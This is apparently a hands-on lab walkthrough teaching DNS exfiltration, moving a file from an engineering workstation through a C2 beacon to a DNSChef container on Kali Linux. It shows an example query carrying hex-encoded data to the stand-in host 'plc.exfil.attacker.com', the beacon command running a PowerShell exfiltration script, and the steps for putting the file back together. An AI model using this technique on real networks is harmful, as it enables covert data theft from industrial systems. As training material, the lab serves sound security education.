### Exfiltrating the File from the Engineering Station

First, we will set up a Docker container on Kali Linux. Open a new terminal and enter the following commands:

```
cd ~/dnschef/dnschef-lab
docker compose down
docker compose up -d
docker compose logs -f
```

<div class="info">
What is happening here?
We have installed a Docker container on this Kali Linux machine. Inside this container, we are running a service that listens to all incoming DNS traffic. These commands reset the container to ensure you have a clean service to start with. 
If you see the line `DNSChef is active`, you are ready to proceed.

**Understanding DNS Exfiltration**

In this activity, we use a DNS exfiltration technique to move data out of a network by hiding it inside DNS queries.

Normally, DNS is used to resolve domain names (like google.com) into IP addresses. However, in this scenario, we use it to send file data out of the network. The file we want to exfiltrate is broken into small `chunks`. Each chunk is only a few bytes, small enough to fit inside a standard DNS query.

*For example, a data chunk might look like this:*
`626974733D636F6E666964656E7469616C2E646F63`

*This chunk is then sent using a spoofed DNS request, such as:*
`626974733D636F6E666964656E7469616C2E646F63.plc.exfil.attacker.com`

To the network, this appears to be a standard attempt to resolve a very long domain name. In reality, we are hiding data in the subdomain prefix.

	

**Executing the Exfiltration**

Go to Adaptix and interact with the Engineering Station beacon. Ensure you are using the one with Admin context.

Run the following command:
```
powershell c:\Temp\dns.ps1
```

This script will exfiltrate a small `.inf`o` file from the workstation to the Kali Linux machine. We are using a small file because this method of exfiltration is time-consuming. *For instance, transferring the BlackoutToLockout_backup.ap20 file (147KB) would require 5,606 chunks to complete.*

**Reassembling the Data**

Once the transfer is complete, press `Ctrl + C` and run these commands to reconstruct the file:
```
docker compose exec dnschef bash 
python3 reassemble_dns_files.py
```
You should receive the following message:
`[+] Reconstructed file for student-1: student-1.recovered ...`

The Python script inside the container has recreated the file from all the `A-record` requests recorded in the logs.
![Screenshot_dnsexfill_4.png](/images/Screenshot_dnsexfill_4.png)

You can run:
```
cat student-1.recovered
```
to view the contents, but let's move the file from the container to the Kali Linux host before shutting down the Docker instance.

Type these commands:
```
exit
sudo docker cp dnschef-lab-dnschef-1:/app/student-1.recovered ~/dnschef/
docker compose down
```

You can now find the recovered file in your home folder at `~/dnschef/student-1.recovered`.
![Screenshot_dnsexfill_5.png](/images/Screenshot_dnsexfill_5.png)

*Note: We previously exfiltrated the larger `.ap20` file prior to this workshop to demonstrate that this technique scales to larger files.*
